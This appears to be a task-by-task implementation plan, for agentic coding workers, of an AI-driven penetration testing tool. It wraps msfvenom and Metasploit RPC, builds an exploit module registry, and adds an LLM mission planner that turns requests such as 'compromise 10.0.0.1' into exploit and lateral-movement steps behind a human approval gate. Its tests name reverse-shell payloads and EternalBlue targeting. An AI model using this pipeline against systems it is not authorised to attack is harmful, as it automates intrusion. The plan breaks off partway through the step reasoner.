# SpectreNet Phase 2 — Core Attack Loop Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement the core attack loop — msfvenom payload generation, Metasploit RPC bridge, native Python exploit module system, AI mission planner + step reasoner, and the approval-gated execution pipeline wired into the TUI.

**Architecture:** A new `msf/` package wraps `pymetasploit3` behind a thin injectable bridge; a new `engines/exploit.py` orchestrates native Python exploit modules (autodiscovered from `engines/exploit_modules/`) and the MSF bridge. A new `ai/` package contains the mission planner (NL → structured plan) and step reasoner (state → next action), both calling `ModelInterface.complete()`. The approval gate (`tui/approval_gate.py`) exposes `ActionCard` + `ApprovalResult` types; `tui/app.py` gains a `mission` command that runs the AI pipeline with async approval blocking via `asyncio.Event`.

**Tech Stack:** Python 3.11+, pymetasploit3 (optional, lazy import), Textual workers + asyncio.Event (approval gate), existing ModelInterface/ReconEngine/WrapperRegistry from Phase 1.

---

## File Structure

```
spectrenet/
  wrappers/
    builtin/
      msfvenom.py              # NEW — payload generation (follows nmap/masscan pattern)
  msf/
    __init__.py                # NEW
    bridge.py                  # NEW — MsfBridge wrapping pymetasploit3 (injectable client)
  engines/
    exploit.py                 # NEW — ExploitEngine: native modules + MSF bridge
    exploit_modules/
      __init__.py              # NEW
      base.py                  # NEW — ExploitModule ABC + ExploitResult dataclass
      registry.py              # NEW — autodiscovery (mirrors WrapperRegistry pattern)
      modules/
        __init__.py            # NEW — empty; drop native exploit .py files here
  ai/
    __init__.py                # NEW
    mission_planner.py         # NEW — MissionPlanner: NL → MissionPlan(steps)
    step_reasoner.py           # NEW — StepReasoner: session state → next PlanStep
  tui/
    approval_gate.py           # NEW — ActionCard, ApprovalResult, format_action_card()
    app.py                     # MODIFY — add mission command, approval gate, AI pipeline
  storage/
    schema.sql                 # MODIFY — add approvals table
    session.py                 # MODIFY — add log_approval() method
pyproject.toml                 # MODIFY — add pymetasploit3 to optional [msf] extra

tests/
  test_msfvenom_wrapper.py     # NEW
  test_msf_bridge.py           # NEW
  test_exploit_module_registry.py  # NEW
  test_exploit_engine.py       # NEW
  test_approval_gate.py        # NEW
  test_mission_planner.py      # NEW
  test_step_reasoner.py        # NEW
```

---

## Task 1: msfvenom wrapper

**Files:**
- Create: `spectrenet/wrappers/builtin/msfvenom.py`
- Test: `tests/test_msfvenom_wrapper.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_msfvenom_wrapper.py
from unittest.mock import patch, MagicMock
import hashlib
from spectrenet.wrappers.builtin.msfvenom import MsfvenomWrapper

def test_msfvenom_tool_name_and_schema():
    w = MsfvenomWrapper()
    assert w.tool_name == "msfvenom"
    assert "payload_path" in w.schema
    assert "hash" in w.schema
    assert "delivery_method" in w.schema

def test_msfvenom_run_returns_normalized_output(tmp_path):
    w = MsfvenomWrapper()
    fake_payload = b"\x90\x90\x90\xcc"

    def fake_subprocess_run(cmd, **kw):
        (tmp_path / "payload.exe").write_bytes(fake_payload)
        return MagicMock(returncode=0)

    with patch("spectrenet.wrappers.builtin.msfvenom.subprocess.run",
               side_effect=fake_subprocess_run):
        result = w.run(
            payload_type="windows/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            fmt="exe",
            output_dir=str(tmp_path),
        )

    expected_hash = hashlib.sha256(fake_payload).hexdigest()
    assert result["payload_path"] == str(tmp_path / "payload.exe")
    assert result["hash"] == expected_hash
    assert result["delivery_method"] == "exe"

def test_msfvenom_run_builds_correct_command(tmp_path):
    w = MsfvenomWrapper()
    captured = {}

    def fake_subprocess_run(cmd, **kw):
        captured["cmd"] = cmd
        (tmp_path / "payload.elf").write_bytes(b"\x7fELF")
        return MagicMock(returncode=0)

    with patch("spectrenet.wrappers.builtin.msfvenom.subprocess.run",
               side_effect=fake_subprocess_run):
        w.run(payload_type="linux/x86/shell_reverse_tcp",
              lhost="192.168.1.1", lport=9001, fmt="elf", output_dir=str(tmp_path))

    assert "msfvenom" in captured["cmd"]
    assert "-p" in captured["cmd"]
    assert "linux/x86/shell_reverse_tcp" in captured["cmd"]
    assert "LHOST=192.168.1.1" in captured["cmd"]
    assert "LPORT=9001" in captured["cmd"]
    assert "-f" in captured["cmd"]
    assert "elf" in captured["cmd"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_msfvenom_wrapper.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'spectrenet.wrappers.builtin.msfvenom'`

- [ ] **Step 3: Write minimal implementation**

```python
# spectrenet/wrappers/builtin/msfvenom.py
import hashlib
import subprocess
import tempfile
from pathlib import Path
from spectrenet.wrappers.base import ToolWrapper

class MsfvenomWrapper(ToolWrapper):
    tool_name = "msfvenom"
    binary = "msfvenom"

    @property
    def schema(self) -> dict:
        return {"payload_path": str, "hash": str, "delivery_method": str}

    def run(self, payload_type: str, lhost: str, lport: int,
            fmt: str = "exe", output_dir: str = None, **kwargs) -> dict:
        out_dir = Path(output_dir) if output_dir else Path(tempfile.gettempdir())
        out_path = out_dir / f"payload.{fmt}"
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", str(out_path),
        ]
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        payload_bytes = out_path.read_bytes()
        return {
            "payload_path": str(out_path),
            "hash": hashlib.sha256(payload_bytes).hexdigest(),
            "delivery_method": fmt,
        }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_msfvenom_wrapper.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Commit**

```bash
git add spectrenet/wrappers/builtin/msfvenom.py tests/test_msfvenom_wrapper.py
git commit -m "feat: add msfvenom wrapper with SHA-256 payload hash"
```

---

## Task 2: Metasploit RPC bridge

**Files:**
- Create: `spectrenet/msf/__init__.py`
- Create: `spectrenet/msf/bridge.py`
- Modify: `pyproject.toml` (add `[msf]` optional extra)
- Test: `tests/test_msf_bridge.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_msf_bridge.py
from spectrenet.msf.bridge import MsfBridge, MsfSession

class _FakeExploit(dict):
    def execute(self, payload=""):
        return {"job_id": 42}

class _FakeModules:
    def use(self, mtype, path):
        return _FakeExploit()

class _FakeSessions:
    @property
    def list(self):
        return {
            "1": {"type": "meterpreter", "tunnel_peer": "10.0.0.1:1234"}
        }

class _FakeClient:
    def __init__(self):
        self.modules = _FakeModules()
        self.sessions = _FakeSessions()

def test_bridge_connects_with_injected_client():
    bridge = MsfBridge(client=_FakeClient())
    assert bridge.connect() is True
    assert bridge.is_connected() is True

def test_bridge_run_module_returns_job_id():
    bridge = MsfBridge(client=_FakeClient())
    bridge.connect()
    job_id = bridge.run_module("exploit/multi/handler",
                               {"LHOST": "10.0.0.1", "LPORT": "4444"})
    assert job_id == "42"

def test_bridge_get_sessions_returns_list():
    bridge = MsfBridge(client=_FakeClient())
    bridge.connect()
    sessions = bridge.get_sessions()
    assert len(sessions) == 1
    assert sessions[0].type == "meterpreter"
    assert sessions[0].tunnel_peer == "10.0.0.1:1234"

def test_bridge_run_module_raises_when_not_connected():
    bridge = MsfBridge(client=_FakeClient())  # not yet connected
    try:
        bridge.run_module("exploit/multi/handler", {})
        assert False, "should raise"
    except RuntimeError as e:
        assert "connected" in str(e).lower()

def test_bridge_is_connected_false_by_default():
    bridge = MsfBridge(client=_FakeClient())
    assert bridge.is_connected() is False

def test_bridge_connect_fails_gracefully_without_pymetasploit3():
    # No injected client, no real msfrpcd — connect() must return False gracefully
    bridge = MsfBridge(host="127.0.0.1", port=19999)
    result = bridge.connect()
    assert result is False
    assert bridge.is_connected() is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_msf_bridge.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'spectrenet.msf'`

- [ ] **Step 3: Create `spectrenet/msf/__init__.py`** (empty)

- [ ] **Step 4: Write the bridge implementation**

```python
# spectrenet/msf/bridge.py
import logging
from dataclasses import dataclass

log = logging.getLogger("spectrenet")


@dataclass
class MsfSession:
    id: str
    type: str
    tunnel_peer: str
    info: dict


class MsfBridge:
    """Thin wrapper around pymetasploit3's MsfRpcClient. Client is injectable for tests."""

    def __init__(self, host: str = "127.0.0.1", port: int = 55553,
                 password: str = "msf", ssl: bool = False, client=None):
        self.host = host
        self.port = port
        self.password = password
        self.ssl = ssl
        self._client = client
        self._connected = False

    def connect(self) -> bool:
        if self._client is not None:
            self._connected = True
            return True
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            self._client = MsfRpcClient(
                self.password, host=self.host, port=self.port, ssl=self.ssl
            )
            self._connected = True
            log.info("Connected to msfrpcd at %s:%d", self.host, self.port)
            return True
        except Exception as e:
            log.warning("Failed to connect to msfrpcd: %s", e)
            return False

    def is_connected(self) -> bool:
        return self._connected

    def run_module(self, module_path: str, options: dict) -> str | None:
        """Run an exploit module. Returns job_id string or None on failure."""
        if not self._connected:
            raise RuntimeError("Not connected to msfrpcd — call connect() first")
        try:
            exploit = self._client.modules.use("exploit", module_path)
            for k, v in options.items():
                exploit[k] = v
            result = exploit.execute(payload=options.get("PAYLOAD", ""))
            return str(result.get("job_id", ""))
        except Exception as e:
            log.error("MSF module execution failed: %s", e)
            return None

    def get_sessions(self) -> list[MsfSession]:
        """Return all active Metasploit sessions."""
        if not self._connected:
            return []
        try:
            raw = self._client.sessions.list
            return [
                MsfSession(id=sid, type=info.get("type", ""),
                           tunnel_peer=info.get("tunnel_peer", ""), info=info)
                for sid, info in raw.items()
            ]
        except Exception as e:
            log.warning("Failed to list MSF sessions: %s", e)
            return []
```

- [ ] **Step 5: Add optional `[msf]` extra to `pyproject.toml`**

Open `pyproject.toml` and add `msf` to `[project.optional-dependencies]`:

```toml
[project.optional-dependencies]
dev = ["pytest>=8.0", "pytest-cov>=4.1"]
msf = ["pymetasploit3>=1.0"]
```

- [ ] **Step 6: Run test to verify it passes**

Run: `python -m pytest tests/test_msf_bridge.py -v`
Expected: PASS (6 passed)

- [ ] **Step 7: Commit**

```bash
git add spectrenet/msf/__init__.py spectrenet/msf/bridge.py tests/test_msf_bridge.py pyproject.toml
git commit -m "feat: add Metasploit RPC bridge with injectable client"
```

---

## Task 3: Native exploit module base + registry

**Files:**
- Create: `spectrenet/engines/exploit_modules/__init__.py`
- Create: `spectrenet/engines/exploit_modules/base.py`
- Create: `spectrenet/engines/exploit_modules/registry.py`
- Create: `spectrenet/engines/exploit_modules/modules/__init__.py`
- Test: `tests/test_exploit_module_registry.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_exploit_module_registry.py
from spectrenet.engines.exploit_modules.registry import ExploitModuleRegistry
from spectrenet.engines.exploit_modules.base import ExploitModule, ExploitResult

def test_registry_discovers_module_from_extra_dir(tmp_path):
    modules_dir = tmp_path / "modules"
    modules_dir.mkdir()
    (modules_dir / "__init__.py").write_text("")
    (modules_dir / "demo.py").write_text(
        "from spectrenet.engines.exploit_modules.base import ExploitModule, ExploitResult\n"
        "class DemoExploit(ExploitModule):\n"
        "    name = 'demo/test'\n"
        "    description = 'Demo exploit'\n"
        "    target_ports = [9999]\n"
        "    def check(self, host, port): return True\n"
        "    def run(self, host, port, options):\n"
        "        return ExploitResult(success=True, module_name=self.name, target=f'{host}:{port}')\n"
    )
    reg = ExploitModuleRegistry(extra_dirs=[modules_dir])
    reg.discover()
    assert "demo/test" in reg.names()
    result = reg.get("demo/test").run("10.0.0.1", 9999, {})
    assert result.success is True
    assert result.target == "10.0.0.1:9999"

def test_registry_skips_classes_without_name(tmp_path):
    modules_dir = tmp_path / "modules"
    modules_dir.mkdir()
    (modules_dir / "__init__.py").write_text("")
    (modules_dir / "noname.py").write_text(
        "from spectrenet.engines.exploit_modules.base import ExploitModule, ExploitResult\n"
        "class NoName(ExploitModule):\n"
        "    def check(self, host, port): return False\n"
        "    def run(self, host, port, options): return ExploitResult(False,'','','')\n"
    )
    reg = ExploitModuleRegistry(extra_dirs=[modules_dir])
    reg.discover()
    assert reg.names() == []

def test_exploit_result_dataclass():
    r = ExploitResult(success=True, module_name="test/mod", target="10.0.0.1:80")
    assert r.success is True
    assert r.session_id == ""
    assert r.error == ""
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_exploit_module_registry.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Create the files**

Create `spectrenet/engines/exploit_modules/__init__.py` and `spectrenet/engines/exploit_modules/modules/__init__.py` — both empty.

```python
# spectrenet/engines/exploit_modules/base.py
from abc import ABC, abstractmethod
from dataclasses import dataclass, field


@dataclass
class ExploitResult:
    success: bool
    module_name: str
    target: str
    session_id: str = ""
    output: str = ""
    error: str = ""


class ExploitModule(ABC):
    """Base class for native Python exploit modules. No Metasploit required."""

    name: str = ""
    description: str = ""
    target_ports: list = []

    @abstractmethod
    def check(self, host: str, port: int) -> bool:
        """Return True if the target appears vulnerable to this exploit."""

    @abstractmethod
    def run(self, host: str, port: int, options: dict) -> ExploitResult:
        """Execute the exploit against host:port. Return ExploitResult."""
```

```python
# spectrenet/engines/exploit_modules/registry.py
import importlib.util
import inspect
import logging
from pathlib import Path
from spectrenet.engines.exploit_modules.base import ExploitModule

log = logging.getLogger("spectrenet")


class ExploitModuleRegistry:
    """Autodiscovers ExploitModule subclasses from modules/ and extra_dirs."""

    def __init__(self, extra_dirs=None):
        here = Path(__file__).parent
        self._dirs = [here / "modules"]
        if extra_dirs:
            self._dirs.extend(Path(d) for d in extra_dirs)
        self._modules: dict[str, ExploitModule] = {}

    def discover(self) -> None:
        for d in self._dirs:
            if not d.exists():
                continue
            for py in sorted(d.glob("*.py")):
                if py.name == "__init__.py":
                    continue
                self._load_file(py)

    def _load_file(self, py: Path) -> None:
        spec = importlib.util.spec_from_file_location(f"_snmod_{py.stem}", py)
        module = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(module)
        except Exception as e:
            log.warning("Failed to load exploit module %s: %s", py.name, e)
            return
        for _, obj in inspect.getmembers(module, inspect.isclass):
            if issubclass(obj, ExploitModule) and obj is not ExploitModule:
                if not getattr(obj, "name", ""):
                    continue
                instance = obj()
                self._modules[instance.name] = instance
                log.info("Registered exploit module '%s'", instance.name)

    def names(self) -> list[str]:
        return sorted(self._modules)

    def get(self, name: str) -> ExploitModule:
        return self._modules[name]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_exploit_module_registry.py -v`
Expected: PASS (3 passed)

- [ ] **Step 5: Commit**

```bash
git add spectrenet/engines/exploit_modules/ tests/test_exploit_module_registry.py
git commit -m "feat: add native exploit module base and autodiscovery registry"
```

---

## Task 4: Exploit engine

**Files:**
- Create: `spectrenet/engines/exploit.py`
- Test: `tests/test_exploit_engine.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_exploit_engine.py
from spectrenet.engines.exploit import ExploitEngine
from spectrenet.engines.exploit_modules.base import ExploitModule, ExploitResult


class _StubModule(ExploitModule):
    name = "stub/test"
    target_ports = [80]
    def check(self, host, port): return True
    def run(self, host, port, options):
        return ExploitResult(success=True, module_name=self.name,
                             target=f"{host}:{port}", session_id="sess-1")


class _FakeModuleRegistry:
    def __init__(self): self._m = {"stub/test": _StubModule()}
    def names(self): return list(self._m)
    def get(self, n): return self._m[n]


class _FakeBridge:
    def is_connected(self): return True
    def run_module(self, path, opts): return "job-99"


def test_exploit_engine_runs_native_module():
    eng = ExploitEngine(module_registry=_FakeModuleRegistry())
    result = eng.run_native("stub/test", "10.0.0.1", 80, {})
    assert result.success is True
    assert result.session_id == "sess-1"
    assert result.target == "10.0.0.1:80"

def test_exploit_engine_returns_error_for_unknown_module():
    eng = ExploitEngine(module_registry=_FakeModuleRegistry())
    result = eng.run_native("unknown/module", "10.0.0.1", 80, {})
    assert result.success is False
    assert "unknown/module" in result.error

def test_exploit_engine_runs_msf_module():
    eng = ExploitEngine(module_registry=_FakeModuleRegistry(), msf_bridge=_FakeBridge())
    result = eng.run_msf("exploit/multi/handler", {"LHOST": "10.0.0.1", "LPORT": "4444"})
    assert result["success"] is True
    assert result["job_id"] == "job-99"

def test_exploit_engine_msf_fails_gracefully_when_not_connected():
    eng = ExploitEngine(module_registry=_FakeModuleRegistry(), msf_bridge=None)
    result = eng.run_msf("exploit/multi/handler", {})
    assert result["success"] is False
    assert "error" in result
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_exploit_engine.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Write minimal implementation**

```python
# spectrenet/engines/exploit.py
import logging
from spectrenet.engines.exploit_modules.base import ExploitResult

log = logging.getLogger("spectrenet")


class ExploitEngine:
    """Orchestrates native exploit modules and the optional MSF bridge."""

    def __init__(self, module_registry, msf_bridge=None):
        self.modules = module_registry
        self.msf = msf_bridge

    def run_native(self, module_name: str, host: str, port: int,
                   options: dict) -> ExploitResult:
        if module_name not in self.modules.names():
            return ExploitResult(
                success=False, module_name=module_name,
                target=f"{host}:{port}",
                error=f"Module '{module_name}' not found",
            )
        mod = self.modules.get(module_name)
        log.info("Running native exploit: %s → %s:%d", module_name, host, port)
        return mod.run(host, port, options)

    def run_msf(self, module_path: str, options: dict) -> dict:
        if self.msf is None or not self.msf.is_connected():
            return {"success": False, "error": "MSF bridge not connected"}
        job_id = self.msf.run_module(module_path, options)
        if job_id is None:
            return {"success": False, "error": "MSF module execution failed"}
        log.info("MSF module dispatched: %s job_id=%s", module_path, job_id)
        return {"success": True, "job_id": job_id}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_exploit_engine.py -v`
Expected: PASS (4 passed)

- [ ] **Step 5: Commit**

```bash
git add spectrenet/engines/exploit.py tests/test_exploit_engine.py
git commit -m "feat: add exploit engine for native modules and MSF bridge"
```

---

## Task 5: Approval gate data structures + session audit

**Files:**
- Create: `spectrenet/tui/approval_gate.py`
- Modify: `spectrenet/storage/schema.sql`
- Modify: `spectrenet/storage/session.py`
- Test: `tests/test_approval_gate.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_approval_gate.py
from spectrenet.tui.approval_gate import (
    ActionCard, ApprovalResult, format_action_card
)
from spectrenet.storage.session import SessionStore

def test_approval_result_enum_values():
    assert ApprovalResult.APPROVED.value == "Y"
    assert ApprovalResult.DENIED.value == "N"
    assert ApprovalResult.SKIPPED.value == "S"

def test_action_card_holds_fields():
    card = ActionCard(
        action="exploit/multi/handler",
        target="192.168.1.45:445",
        module="ms17_010_eternalblue",
        risk="HIGH",
        reason="SMB service detected, patch level < 2017",
    )
    assert card.action == "exploit/multi/handler"
    assert card.risk == "HIGH"

def test_format_action_card_contains_key_fields():
    card = ActionCard(
        action="exploit/multi/handler",
        target="192.168.1.45:445",
        module="ms17_010_eternalblue",
        risk="HIGH",
        reason="EternalBlue candidate",
    )
    rendered = format_action_card(card)
    assert "APPROVAL REQUIRED" in rendered
    assert "exploit/multi/handler" in rendered
    assert "192.168.1.45:445" in rendered
    assert "ms17_010_eternalblue" in rendered
    assert "HIGH" in rendered
    assert "[Y]" in rendered
    assert "[N]" in rendered
    assert "[S]" in rendered

def test_session_store_logs_approval(tmp_path):
    store = SessionStore(tmp_path / "s.db")
    sid = store.create_session("test", "alice")
    store.log_approval(
        session_id=sid,
        operator="alice",
        action="exploit/multi/handler",
        target="192.168.1.45:445",
        risk="HIGH",
        result="Y",
    )
    approvals = store.approvals_for(sid)
    assert len(approvals) == 1
    assert approvals[0]["result"] == "Y"
    assert approvals[0]["action"] == "exploit/multi/handler"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_approval_gate.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Create `spectrenet/tui/approval_gate.py`**

```python
# spectrenet/tui/approval_gate.py
from dataclasses import dataclass
from enum import Enum


class ApprovalResult(Enum):
    APPROVED = "Y"
    DENIED = "N"
    SKIPPED = "S"


@dataclass
class ActionCard:
    action: str
    target: str
    module: str
    risk: str      # HIGH | MED | LOW
    reason: str


def format_action_card(card: ActionCard) -> str:
    w = 56  # inner content width
    def row(label: str, value: str) -> str:
        content = f"  {label:<9}: {value}"
        return f"│{content:<{w}}│"

    lines = [
        f"┌─ APPROVAL REQUIRED {'─' * (w - 20)}┐",
        row("Action", card.action),
        row("Target", card.target),
        row("Module", card.module),
        row("Risk", card.risk),
        row("Reason", card.reason),
        f"│{' ' * w}│",
        f"│  [Y] Approve    [N] Deny    [S] Skip mission step{' ' * (w - 50)}│",
        f"└{'─' * w}┘",
    ]
    return "\n".join(lines)
```

- [ ] **Step 4: Modify `spectrenet/storage/schema.sql`** — add the approvals table:

Add after the existing `actions` table:

```sql
CREATE TABLE IF NOT EXISTS approvals (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id INTEGER NOT NULL,
    ts TEXT NOT NULL,
    operator TEXT NOT NULL,
    action TEXT NOT NULL,
    target TEXT NOT NULL,
    risk TEXT NOT NULL,
    result TEXT NOT NULL,
    FOREIGN KEY (session_id) REFERENCES sessions(id)
);
```

- [ ] **Step 5: Modify `spectrenet/storage/session.py`** — add `log_approval` and `approvals_for`:

Add the following two methods to `SessionStore` (after `actions_for`):

```python
    def log_approval(self, session_id: int, operator: str, action: str,
                     target: str, risk: str, result: str) -> None:
        self.conn.execute(
            "INSERT INTO approvals (session_id, ts, operator, action, target, risk, result) "
            "VALUES (?,?,?,?,?,?,?)",
            (session_id, _now(), operator, action, target, risk, result),
        )
        self.conn.commit()

    def approvals_for(self, session_id: int) -> list[dict]:
        rows = self.conn.execute(
            "SELECT * FROM approvals WHERE session_id=? ORDER BY id", (session_id,)
        ).fetchall()
        return [dict(r) for r in rows]
```

- [ ] **Step 6: Run test to verify it passes**

Run: `python -m pytest tests/test_approval_gate.py -v`
Expected: PASS (4 passed)

- [ ] **Step 7: Run full suite to confirm nothing regressed**

Run: `python -m pytest tests/ -v`
Expected: all prior tests still pass.

- [ ] **Step 8: Commit**

```bash
git add spectrenet/tui/approval_gate.py spectrenet/storage/schema.sql \
        spectrenet/storage/session.py tests/test_approval_gate.py
git commit -m "feat: add approval gate types, card formatter, and approval audit log"
```

---

## Task 6: AI mission planner

**Files:**
- Create: `spectrenet/ai/__init__.py`
- Create: `spectrenet/ai/mission_planner.py`
- Test: `tests/test_mission_planner.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_mission_planner.py
from spectrenet.ai.mission_planner import MissionPlanner, PlanStep, MissionPlan, INTRUSIVE_ACTIONS
from spectrenet.model.interface import ModelInterface


class EchoModel(ModelInterface):
    """Returns a canned JSON plan."""
    def __init__(self, response: str): self._response = response
    def complete(self, system_prompt, user_prompt): return self._response


VALID_PLAN_JSON = """
{
  "steps": [
    {
      "step_id": 1,
      "action_type": "recon",
      "tool": "nmap",
      "target": "10.0.0.1",
      "params": {"flags": "-sV"},
      "risk_level": "LOW",
      "rationale": "discover open ports"
    },
    {
      "step_id": 2,
      "action_type": "exploit",
      "tool": "ms17_010_eternalblue",
      "target": "10.0.0.1",
      "params": {"LHOST": "10.0.0.2", "LPORT": "4444"},
      "risk_level": "HIGH",
      "rationale": "SMB port open"
    }
  ]
}
"""


def test_mission_planner_returns_mission_plan():
    planner = MissionPlanner(EchoModel(VALID_PLAN_JSON))
    plan = planner.plan("compromise 10.0.0.1")
    assert isinstance(plan, MissionPlan)
    assert len(plan.steps) == 2


def test_mission_planner_parses_steps_correctly():
    planner = MissionPlanner(EchoModel(VALID_PLAN_JSON))
    plan = planner.plan("compromise 10.0.0.1")
    step1, step2 = plan.steps
    assert step1.step_id == 1
    assert step1.action_type == "recon"
    assert step1.tool == "nmap"
    assert step1.target == "10.0.0.1"
    assert step1.params == {"flags": "-sV"}
    assert step1.risk_level == "LOW"
    assert step2.action_type == "exploit"
    assert step2.risk_level == "HIGH"


def test_mission_planner_marks_intrusive_steps_for_approval():
    planner = MissionPlanner(EchoModel(VALID_PLAN_JSON))
    plan = planner.plan("compromise 10.0.0.1")
    recon_step = plan.steps[0]
    exploit_step = plan.steps[1]
    assert recon_step.requires_approval is False
    assert exploit_step.requires_approval is True


def test_mission_planner_returns_empty_plan_on_bad_json():
    planner = MissionPlanner(EchoModel("not valid json at all"))
    plan = planner.plan("do something")
    assert isinstance(plan, MissionPlan)
    assert plan.steps == []


def test_mission_planner_strips_markdown_fences():
    fenced = "```json\n" + VALID_PLAN_JSON.strip() + "\n```"
    planner = MissionPlanner(EchoModel(fenced))
    plan = planner.plan("test")
    assert len(plan.steps) == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_mission_planner.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Create `spectrenet/ai/__init__.py`** (empty)

- [ ] **Step 4: Write the implementation**

```python
# spectrenet/ai/mission_planner.py
import json
import logging
from dataclasses import dataclass, field
from spectrenet.model.interface import ModelInterface

log = logging.getLogger("spectrenet")

INTRUSIVE_ACTIONS = {"exploit", "payload_delivery", "lateral_movement", "persistence"}

SYSTEM_PROMPT = """You are an expert penetration tester. Given a mission and optional recon results, produce a structured attack plan as JSON.

Output ONLY valid JSON in this exact format:
{
  "steps": [
    {
      "step_id": 1,
      "action_type": "recon|exploit|payload_delivery|lateral_movement|post_ex",
      "tool": "tool_name",
      "target": "ip_or_hostname",
      "params": {},
      "risk_level": "LOW|MED|HIGH",
      "rationale": "brief reason for this step"
    }
  ]
}

Rules:
- action_type must be one of: recon, exploit, payload_delivery, lateral_movement, post_ex
- risk_level HIGH for: exploit, payload_delivery, lateral_movement, persistence
- risk_level LOW for passive recon; MED for active recon
- params must be a flat dict with string keys and string or integer values
- target must be a specific IP address or hostname"""


@dataclass
class PlanStep:
    step_id: int
    action_type: str
    tool: str
    target: str
    params: dict = field(default_factory=dict)
    risk_level: str = "LOW"
    requires_approval: bool = False
    rationale: str = ""


@dataclass
class MissionPlan:
    mission: str
    steps: list[PlanStep] = field(default_factory=list)


class MissionPlanner:
    """Converts a natural-language mission into a structured, ordered attack plan."""

    def __init__(self, model: ModelInterface):
        self.model = model

    def plan(self, mission: str, recon_results: dict | None = None) -> MissionPlan:
        context = f"Mission: {mission}"
        if recon_results:
            context += f"\nRecon results: {json.dumps(recon_results, indent=2)}"
        raw = self.model.complete(SYSTEM_PROMPT, context)
        steps = self._parse(raw)
        for step in steps:
            if step.action_type in INTRUSIVE_ACTIONS:
                step.requires_approval = True
        return MissionPlan(mission=mission, steps=steps)

    def _parse(self, raw: str) -> list[PlanStep]:
        try:
            text = raw.strip()
            if text.startswith("```"):
                parts = text.split("```")
                text = parts[1]
                if text.startswith("json"):
                    text = text[4:]
            data = json.loads(text.strip())
            return [
                PlanStep(
                    step_id=item["step_id"],
                    action_type=item["action_type"],
                    tool=item["tool"],
                    target=item["target"],
                    params=item.get("params", {}),
                    risk_level=item.get("risk_level", "LOW"),
                    rationale=item.get("rationale", ""),
                )
                for item in data.get("steps", [])
            ]
        except Exception as e:
            log.error("Failed to parse mission plan: %s | raw: %.200s", e, raw)
            return []
```

- [ ] **Step 5: Run test to verify it passes**

Run: `python -m pytest tests/test_mission_planner.py -v`
Expected: PASS (5 passed)

- [ ] **Step 6: Commit**

```bash
git add spectrenet/ai/__init__.py spectrenet/ai/mission_planner.py tests/test_mission_planner.py
git commit -m "feat: add AI mission planner (NL to structured attack plan)"
```

---

## Task 7: AI step reasoner

**Files:**
- Create: `spectrenet/ai/step_reasoner.py`
- Test: `tests/test_step_reasoner.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_step_reasoner.py
from spectrenet.ai.step_reasoner import StepReasoner
from spectrenet.ai.mission_planner import PlanStep, INTRUSIVE_ACTIONS
from spectrenet.model.interface import ModelInterface


class EchoModel(ModelInterface):
    def __init__(self, response: str): self._response = response
    def complete(self, system_prompt, user_prompt): return self._response


NEXT_STEP_JSON = """{
  "step_id": 3,
  "action_type": "exploit",
  "tool": "ms17_010_eternalblue",
  "target": "10.0.0.1",
  "params": {"LHOST": "10.0.0.2"},
  "risk_level": "HIGH",
  "rationale": "port 445 open and unpatched"
}"""

DONE_JSON = '{"done": true, "rationale": "all targets compromised"}'


def test_step_reasoner_returns_plan_step():
    reasoner = StepReasoner(EchoModel(NEXT_STEP_JSON))
    state = {"hosts": [{"ip": "10.0.0.1", "ports": [{"port": 445}]}]}
    step = reasoner.next_step(state)
    assert isinstance(step, PlanStep)
    assert step.step_id == 3
    assert step.tool == "ms17_010_eternalblue"
    assert step.target == "10.0.0.1"


def test_step_reasoner_marks_intrusive_step_for_approval():
    reasoner = StepReasoner(EchoModel(NEXT_STEP_JSON))
    step = reasoner.next_step({})
    assert step.requires_approval is True  # exploit is intrusive


def test_step_reasoner_returns_none_when_done():
    reasoner = StepReasoner(EchoModel(DONE_JSON))
    step = reasoner.next_step({"completed": True})
    assert step is None


def test_step_reasoner_returns_none_on_bad_json():
    reasoner = StepReasoner(EchoModel("garbage response"))
    step = reasoner.next_step({})
    assert step is None


def test_step_reasoner_strips_markdown_fences():
    fenced = "```json\n" + NEXT_STEP_JSON + "\n```"
    reasoner = StepReasoner(EchoModel(fenced))
    step = reasoner.next_step({})
    assert step is not None
    assert step.tool == "ms17_010_eternalblue"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_step_reasoner.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Write the implementation**

```python
# spectrenet/ai/step_reasoner.py
import json
import logging
from spectrenet.model.interface import ModelInterface
from spectrenet.ai.mission_planner import PlanStep, INTRUSIVE_ACTIONS

